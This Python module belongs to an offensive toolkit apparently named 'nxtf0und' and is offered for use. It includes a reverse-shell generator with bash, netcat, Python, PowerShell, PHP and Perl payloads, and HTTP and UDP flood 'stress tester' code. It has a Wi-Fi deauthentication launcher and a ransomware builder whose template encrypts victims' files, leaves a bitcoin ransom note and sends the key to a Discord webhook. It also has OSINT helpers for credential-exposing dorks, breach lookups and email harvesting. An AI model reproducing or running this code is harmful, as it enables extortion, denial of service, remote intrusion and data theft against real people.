"""Advanced tooling."""

import concurrent.futures
import json
import os
import random
import re
import shutil
import socket
import string
import subprocess
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = os.path.dirname(os.path.abspath(__file__))
BUILDS = os.path.join(BASE, "builds")

def _json(nf, url, headers=None, body_limit=2_000_000):
    r = nf.http(url, nf.CFG, extra_headers=headers, body_limit=body_limit,
                timeout=max(12, nf.CFG["timeout"]))
    if r.error:
        return None
    try:
        return json.loads(r.text)
    except Exception:
        return None

SHELLS = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash-196": "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
    "python3": ("python3 -c 'import socket,subprocess,os;"
                "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "ncat": "ncat {lhost} {lport} -e /bin/sh",
    "powershell": ("powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                   "New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                   "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                   "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                   "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
                   "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                   "$sb=([text.encoding]::ASCII).GetBytes($r2);"
                   "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"),
    "php": ("php -r '$s=fsockopen(\"{lhost}\",{lport});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");' 3<>/dev/tcp/{lhost}/{lport}"),
    "perl": ("perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
             "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
             "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
             "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
             "exec(\"/bin/sh -i\");};'"),
}

def cmd_reverse_shell(nf):
    lhost = nf.ask("lhost")
    lport = nf.ask("lport", "4444")
    if not lhost:
        return
    nf.section("payloads")
    for name, tpl in SHELLS.items():
        nf.kv(name, tpl.format(lhost=lhost, lport=lport))
    nf.note(f"listener: nc -lvnp {lport}")
    out = {"lhost": lhost, "lport": lport, "shells": {k: v.format(lhost=lhost, lport=lport)
                                                     for k, v in SHELLS.items()}}
    nf.save_report(f"revshell_{lhost}", out)

def _http_flood(url, duration, stop):
    ua = ["Mozilla/5.0", "curl/8.0", "python-requests/2.31"]
    sent = 0
    while time.time() < stop:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(ua)})
            urllib.request.urlopen(req, timeout=4).read(2048)
        except Exception:
            pass
        sent += 1
    return sent

def _udp_flood(host, port, duration, stop):
    sent = 0
    payload = os.urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < stop:
        try:
            sock.sendto(payload, (host, port))
            sent += 1
        except Exception:
            break
    sock.close()
    return sent

def cmd_stress(nf):
    nf.section("stress tester")
    nf.kv("1", "HTTP flood")
    nf.kv("2", "UDP flood")
    mode = nf.ask("mode", "1")
    target = nf.ask("target url or ip")
    if not target:
        return
    duration = nf.ask("duration seconds", "10")
    threads = nf.ask("threads", "16")
    try:
        duration = max(1, min(120, int(duration)))
        threads = max(1, min(64, int(threads)))
    except ValueError:
        duration, threads = 10, 16
    if nf.ask("this sends live traffic — type YES to proceed", "n") != "YES":
        return
    stop = time.time() + duration
    results = []
    if mode == "2":
        host = target.split("//")[-1].split("/")[0].split(":")[0]
        port = nf.ask("udp port", "80")
        try:
            port = int(port)
        except ValueError:
            port = 80
        jobs = [threading.Thread(target=lambda: results.append(
            _udp_flood(host, port, duration, stop))) for _ in range(threads)]
    else:
        url = nf.normalize_url(target)
        jobs = [threading.Thread(target=lambda: results.append(
            _http_flood(url, duration, stop))) for _ in range(threads)]
    for t in jobs:
        t.start()
    while time.time() < stop:
        remaining = max(0, int(stop - time.time()))
        print("  " + nf.P.dim(f"running — {remaining}s left"), end="\r")
        time.sleep(1)
    for t in jobs:
        t.join(timeout=5)
    nf.finding("OK", f"requests sent: {sum(results):,}")
    nf.note("load depends on target capacity and your uplink")

RANSOM_TEMPLATE = r'''#!/usr/bin/env python3
# generated by nxtf0und
import json
import os
import sys
import time
import urllib.request

WEBHOOK = "__WEBHOOK__"
TARGET = "__TARGET__"
EXTS = __EXTS__

NOTE = "README_nxtf0und.txt"
NOTE_TEXT = """your files were encrypted by nxtf0und.

send 0.05 btc to the address in the discord message
and the decryption key will follow.
"""

def post(payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(WEBHOOK, data=data,
                                 headers={"Content-Type": "application/json",
                                          "User-Agent": "Mozilla/5.0"})
    try:
        urllib.request.urlopen(req, timeout=20)
    except Exception:
        pass

def encrypt():
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    cipher = Fernet(key)
    touched = 0
    for root, dirs, files in os.walk(TARGET):
        dirs[:] = [d for d in dirs if d not in (".git", "node_modules", "__pycache__")]
        for name in files:
            ext = os.path.splitext(name)[1].lower()
            if ext not in EXTS:
                continue
            path = os.path.join(root, name)
            try:
                with open(path, "rb") as fh:
                    raw = fh.read()
                with open(path + ".nxtf0und", "wb") as fh:
                    fh.write(cipher.encrypt(raw))
                os.remove(path)
                touched += 1
            except Exception:
                continue
        try:
            with open(os.path.join(root, NOTE), "w", encoding="utf-8") as fh:
                fh.write(NOTE_TEXT)
        except Exception:
            pass
    post({"content": "nxtf0und key: `" + key.decode() + "` — files: " + str(touched)})
    return touched

if __name__ == "__main__":
    count = encrypt()
    print("encrypted", count)
'''

def cmd_ransomware(nf):
    nf.section("ransomware builder")
    webhook = nf.ask("discord webhook (key exfil)")
    target = nf.ask("target directory", os.path.expanduser("~/Documents"))
    exts = nf.ask("extensions (comma separated)", ".txt,.doc,.docx,.pdf,.jpg,.png,.sql,.zip")
    if not webhook.startswith("http") or not target:
        nf.finding("HIGH", "webhook and target required")
        return
    ext_list = [e.strip().lower() if e.strip().startswith(".") else "." + e.strip().lower()
                for e in exts.split(",") if e.strip()]
    code = (RANSOM_TEMPLATE
            .replace("__WEBHOOK__", webhook.replace('"', '\\"'))
            .replace("__TARGET__", target.replace("\\", "\\\\").replace('"', '\\"'))
            .replace("__EXTS__", repr(ext_list)))
    os.makedirs(BUILDS, exist_ok=True)
    path = os.path.join(BUILDS, f"ransom_{time.strftime('%Y%m%d-%H%M%S')}.py")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(code)
    nf.finding("OK", "encryptor written", path)
    nf.kv("extensions", ", ".join(ext_list))
    nf.note("run in a vm against a scratch directory; key posts to the webhook")

def cmd_wifi(nf):
    nf.section("wifi attack")
    nf.kv("1", "scan networks")
    nf.kv("2", "deauth client")
    pick = nf.ask("choice", "1")
    if pick == "1":
        cmds = []
        if shutil.which("nmcli"):
            cmds.append(["nmcli", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list"])
        elif shutil.which("iwlist"):
            cmds.append(["iwlist", "scan"])
        elif shutil.which("iw"):
            cmds.append(["iw", "dev"])
        if not cmds:
            nf.finding("MED", "install nmcli or wireless-tools")
            return
        try:
            subprocess.call(cmds[0])
        except Exception as exc:
            nf.finding("HIGH", "scan failed", str(exc))
        return
    iface = nf.ask("monitor interface (e.g. wlan0mon)")
    bssid = nf.ask("target bssid")
    if not iface or not bssid:
        return
    if nf.ask("send deauth frames — type YES", "n") != "YES":
        return
    if not shutil.which("aireplay-ng"):
        nf.finding("MED", "aireplay-ng missing", "apt install aircrack-ng")
        return
    cmd = ["aireplay-ng", "--deauth", "100", "-a", bssid, iface]
    nf.kv("command", " ".join(cmd))
    try:
        subprocess.call(cmd)
    except Exception as exc:
        nf.finding("HIGH", "deauth failed", str(exc))

DNSBL = [
    "zen.spamhaus.org", "bl.spamcop.net", "b.barracudacentral.org",
    "dnsbl-1.uceprotect.net", "dnsbl-2.uceprotect.net", "dnsbl.sorbs.net",
    "spam.dnsbl.sorbs.net", "psbl.surriel.com", "all.s5h.net", "dnsbl.dronebl.org",
    "cbl.abuseat.org", "ubl.unsubscore.com", "db.wpbl.info", "spam.spamrats.com",
    "ips.backscatterer.org", "rbl.interserver.net", "truncate.gbudb.net",
    "dnsbl.justspam.org", "relays.mail-abuse.org", "black.junkemailfilter.com",
]

def _listed(ip_rev, zone):
    try:
        socket.gethostbyname(f"{ip_rev}.{zone}")
        return zone
    except Exception:
        return None

def cmd_dnsbl(nf):
    host = nf.ask("ip or host")
    if not host:
        return
    try:
        ip = socket.gethostbyname(host)
    except Exception as exc:
        nf.finding("HIGH", "resolution failed", str(exc))
        return
    rev = ".".join(reversed(ip.split(".")))
    nf.section(f"dnsbl — {ip}")
    listed = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
        for res in pool.map(lambda z: _listed(rev, z), DNSBL):
            if res:
                listed.append(res)
                nf.finding("HIGH", "listed", res)
    nf.finding("OK" if not listed else "MED", f"{len(listed)} blacklist hit(s)")

def cmd_cve(nf):
    nf.section("cve lookup")
    nf.kv("1", "by cve id")
    nf.kv("2", "by keyword")
    pick = nf.ask("choice", "1")
    if pick == "2":
        keyword = nf.ask("keyword (product, vendor)")
        url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?"
               + urllib.parse.urlencode({"keywordSearch": keyword, "resultsPerPage": 10}))
    else:
        cve = nf.ask("cve id", "CVE-2021-44228").upper()
        url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?"
               + urllib.parse.urlencode({"cveId": cve}))
    data = _json(nf, url, body_limit=4_000_000)
    if not data or "vulnerabilities" not in data:
        nf.finding("MED", "no data from nvd")
        return
    nf.section(f"results ({data.get('totalResults', 0)})")
    for item in data["vulnerabilities"][:10]:
        cve = item.get("cve", {})
        desc = next((d["value"] for d in cve.get("descriptions", [])
                     if d.get("lang") == "en"), "")
        metrics = cve.get("metrics", {})
        score = "-"
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if metrics.get(key):
                score = metrics[key][0].get("cvssData", {}).get("baseScore", "-")
                break
        nf.kv(cve.get("id"), f"cvss {score}")
        nf.note(f"    {desc[:180]}")
    nf.save_report("cve_lookup", data.get("vulnerabilities", [])[:10])

TAKEOVER = {
    "github.io": "GitHub Pages", "herokuapp.com": "Heroku", "azurewebsites.net": "Azure",
    "cloudfront.net": "CloudFront", "s3.amazonaws.com": "S3", "bitbucket.io": "Bitbucket",
    "netlify.app": "Netlify", "vercel.app": "Vercel", "surge.sh": "Surge",
    "pantheonsite.io": "Pantheon", "wpengine.com": "WPEngine", "readme.io": "ReadMe",
    "helpscoutdocs.com": "HelpScout", "statuspage.io": "Statuspage",
    "unbounce.com": "Unbounce", "ghost.io": "Ghost", "webflow.io": "Webflow",
    "myshopify.com": "Shopify", "fastly.net": "Fastly", "edgekey.net": "Akamai",
    "trafficmanager.net": "Azure TM", "cloudapp.azure.com": "Azure VM",
    "blob.core.windows.net": "Azure Blob", "web.core.windows.net": "Azure Web",
}

def _cname(host):
    if not shutil.which("dig"):
        try:
            return [socket.gethostbyaddr(socket.gethostbyname(host))[0]]
        except Exception:
            return []
    try:
        out = subprocess.check_output(["dig", "+short", "CNAME", host],
                                      stderr=subprocess.DEVNULL, timeout=8).decode()
        return [ln.strip().rstrip(".") for ln in out.splitlines() if ln.strip()]
    except Exception:
        return []

def cmd_takeover(nf):
    domain = nf.ask("domain")
    if not domain:
        return
    subs = nf.ask("subdomains (comma separated, blank = crt.sh)", "")
    if not subs:
        nf.loading("pulling certificate transparency")
        data = _json(nf, f"https://crt.sh/?q=%25.{domain}&output=json", body_limit=5_000_000)
        names = set()
        for entry in data or []:
            for name in (entry.get("name_value") or "").splitlines():
                name = name.strip().lstrip("*.")
                if name.endswith(domain):
                    names.add(name)
    else:
        names = {s.strip() for s in subs.split(",") if s.strip()}
    nf.section(f"cname check — {len(names)} hosts")
    flagged = 0
    for host in sorted(names)[:120]:
        chain = _cname(host)
        for target in chain:
            for suffix, service in TAKEOVER.items():
                if target.endswith(suffix):
                    flagged += 1
                    nf.finding("HIGH", f"possible takeover via {service}", f"{host} -> {target}")
    if not flagged:
        nf.finding("OK", "no dangling cname fingerprints")

def cmd_crtsh(nf):
    domain = nf.ask("domain")
    if not domain:
        return
    nf.loading("querying crt.sh")
    data = _json(nf, f"https://crt.sh/?q=%25.{domain}&output=json", body_limit=6_000_000)
    if not data:
        nf.finding("MED", "no response from crt.sh")
        return
    names = {}
    for entry in data:
        for name in (entry.get("name_value") or "").splitlines():
            name = name.strip().lstrip("*.")
            if name.endswith(domain):
                names[name] = names.get(name, 0) + 1
    nf.section(f"certificates — {len(names)} unique names")
    for name in sorted(names)[:80]:
        nf.kv(name, f"{names[name]} cert(s)")
    nf.finding("OK", f"{len(names)} hostnames")
    nf.save_report(f"crtsh_{domain}", {"domain": domain, "names": names})

def cmd_reverse_ip(nf):
    ip = nf.ask("ip address")
    if not ip:
        return
    try:
        ip = socket.gethostbyname(ip)
    except Exception:
        pass
    r = nf.http(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", nf.CFG)
    if r.error or "error" in r.text.lower()[:200] or "no dns" in r.text.lower():
        nf.finding("MED", "no reverse data", (r.text[:120] if not r.error else r.error))
        return
    nf.section(f"domains on {ip}")
    hosts = [ln.strip() for ln in r.text.splitlines() if ln.strip()]
    for host in hosts[:60]:
        nf.kv(host, "")
    nf.finding("OK", f"{len(hosts)} host(s)")

DORKS = [
    ('inurl:admin', 'admin panels'),
    ('intitle:"index of" "parent directory"', "open directories"),
    ('filetype:env "DB_PASSWORD"', "exposed .env"),
    ('filetype:sql "INSERT INTO"', "database dumps"),
    ('filetype:log "password"', "log files"),
    ('inurl:".git/config"', "git config"),
    ('intitle:"phpinfo()"', "phpinfo"),
    ('inurl:/wp-content/uploads filetype:php', "uploaded php"),
    ('filetype:pdf "confidential"', "confidential docs"),
    ('site:pastebin.com "{domain}"', "pastebin mentions"),
    ('site:trello.com "{domain}"', "trello boards"),
    ('site:docs.google.com "{domain}"', "google docs"),
    ('"@{domain}" email', "email harvest"),
    ('inurl:login | inurl:signin "{domain}"', "login pages"),
]

def cmd_dorks(nf):
    nf.section("google dorks")
    domain = nf.ask("domain or keyword")
    if not domain:
        return
    nf.kv("1", "google")
    nf.kv("2", "bing")
    nf.kv("3", "duckduckgo")
    engine = nf.ask("engine", "1").strip()
    base = {"2": "https://www.bing.com/search?q=",
            "3": "https://duckduckgo.com/?q="}.get(engine, "https://www.google.com/search?q=")
    for dork, label in DORKS:
        query = dork.replace("{domain}", domain)
        nf.kv(label, base + urllib.parse.quote(query))
    nf.note("open in a browser profile that is not tied to your identity")

def cmd_breach(nf):
    email = nf.ask("email")
    if not email:
        return
    nf.loading("checking breach indexes")
    data = _json(nf, f"https://api.xposedornot.com/v1/check-email/{urllib.parse.quote(email)}")
    if data:
        breaches = data.get("breaches") or data.get("Breaches") or []
        if isinstance(breaches, list) and breaches:
            nf.section("breaches")
            flat = []
            for entry in breaches:
                if isinstance(entry, list):
                    flat += entry
                else:
                    flat.append(entry)
            for name in flat[:30]:
                nf.finding("HIGH", str(name))
        else:
            nf.finding("OK", "no public breach hits")
    else:
        nf.finding("MED", "breach api returned nothing")
    nf.note("local corpus: put dumps in ./db and use Utilities -> Search In DataBase")

def cmd_github(nf):
    user = nf.ask("github username")
    if not user:
        return
    nf.loading("querying github")
    api = f"https://api.github.com/users/{user}"
    profile = _json(nf, api)
    if not profile:
        nf.finding("HIGH", "user not found")
        return
    nf.section("profile")
    for key in ("id", "login", "name", "company", "blog", "location", "email",
                "twitter_username", "public_repos", "followers", "created_at"):
        if profile.get(key):
            nf.kv(key, profile[key])
    repos = _json(nf, f"{api}/repos?per_page=30&sort=updated") or []
    nf.section(f"repos ({len(repos)})")
    for repo in repos[:15]:
        nf.kv(repo.get("name", "?"), f"{repo.get('language') or '-'}  {repo.get('stargazers_count', 0)}★")
    orgs = _json(nf, f"{api}/orgs") or []
    if orgs:
        nf.kv("orgs", ", ".join(o.get("login", "") for o in orgs))
    nf.section("commit emails")
    events = _json(nf, f"{api}/events/public?per_page=80") or []
    emails = set()
    for event in events:
        for commit in (event.get("payload", {}).get("commits") or []):
            email = (commit.get("author") or {}).get("email")
            if email:
                emails.add(email)
    for email in sorted(emails):
        nf.finding("LOW", email)
    nf.save_report(f"github_{user}", {"profile": profile, "emails": sorted(emails)})

def cmd_corporate(nf):
    domain = nf.ask("company domain")
    if not domain:
        return
    domain = domain.replace("http://", "").replace("https://", "").split("/")[0]
    nf.section(f"corporate footprint — {domain}")
    try:
        ip = socket.gethostbyname(domain)
        nf.kv("ip", ip)
        geo = _json(nf, f"http://ip-api.com/json/{ip}?fields=country,city,isp,org,as,query")
        if geo:
            nf.kv("org", geo.get("org"))
            nf.kv("asn", geo.get("as"))
            nf.kv("location", f"{geo.get('city')}, {geo.get('country')}")
    except Exception:
        pass
    for record, label in (("MX", "mail"), ("TXT", "txt"), ("NS", "ns")):
        if shutil.which("dig"):
            try:
                out = subprocess.check_output(["dig", "+short", record, domain],
                                              stderr=subprocess.DEVNULL, timeout=8).decode()
                if out.strip():
                    nf.kv(label, out.strip().replace("\n", " | ")[:160])
            except Exception:
                pass
    if shutil.which("dig"):
        try:
            dmarc = subprocess.check_output(["dig", "+short", "TXT", f"_dmarc.{domain}"],
                                            stderr=subprocess.DEVNULL, timeout=8).decode()
            if dmarc.strip():
                nf.kv("dmarc", dmarc.strip().replace("\n", " ")[:160])
            else:
                nf.note("dmarc: none (spoofable sender domain)")
        except Exception:
            pass
    data = _json(nf, f"https://crt.sh/?q=%25.{domain}&output=json", body_limit=4_000_000)
    if data:
        names = {n.strip().lstrip("*.") for e in data
                 for n in (e.get("name_value") or "").splitlines() if n.strip()}
        nf.kv("cert hostnames", len(names))
    page = nf.http(nf.normalize_url(domain), nf.CFG, body_limit=400_000)
    if not page.error:
        links = set(re.findall(r'https?://(?:www\.)?(?:twitter|x|linkedin|facebook|instagram|youtube|github)\.com/[^\s"\'<>]+',
                               page.text, re.I))
        for link in sorted(links)[:12]:
            nf.finding("LOW", "social", link[:100])
    nf.save_report(f"corp_{domain}", {"domain": domain})

def cmd_telegram_channel(nf):
    channel = nf.ask("public channel (without @)")
    if not channel:
        return
    channel = channel.strip().lstrip("@")
    nf.loading("scraping channel preview")
    r = nf.http(f"https://t.me/s/{channel}", nf.CFG, body_limit=2_000_000)
    if r.error or r.status != 200:
        nf.finding("MED", "channel unreachable", r.error or str(r.status))
        return
    text = r.text
    blocks = re.findall(r'tgme_widget_message_text[^>]*>(.*?)</div>', text, re.S)
    def clean(html):
        html = re.sub(r"<br\s*/?>", "\n", html)
        html = re.sub(r"<[^>]+>", "", html)
        return urllib.parse.unquote(html).replace("&amp;", "&").strip()
    messages = [clean(b) for b in blocks][-20:]
    users = sorted(set(re.findall(r"@([A-Za-z0-9_]{4,32})", "\n".join(messages))))
    emails = sorted(set(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",
                                   "\n".join(messages))))
    title = re.search(r'<meta property="og:title" content="([^"]*)"', text)
    nf.section(title.group(1) if title else channel)
    nf.kv("messages", len(messages))
    nf.kv("mentions", len(users))
    for msg in messages[-8:]:
        nf.note(msg[:180].replace("\n", " / "))
    for user in users:
        nf.finding("LOW", f"@{user}")
    for email in emails:
        nf.finding("HIGH", f"email in channel: {email}")
    nf.save_report(f"tgs_{channel}", {"channel": channel, "messages": messages,
                                      "users": users, "emails": emails})

MENU = {
    "advanced": [
        ("Stress Tester", cmd_stress),
        ("Wi-Fi Attack", cmd_wifi),
    ],
    "extensions": [
        ("Ransomware Builder", cmd_ransomware),
        ("Reverse Shell Generator", cmd_reverse_shell),
    ],
}
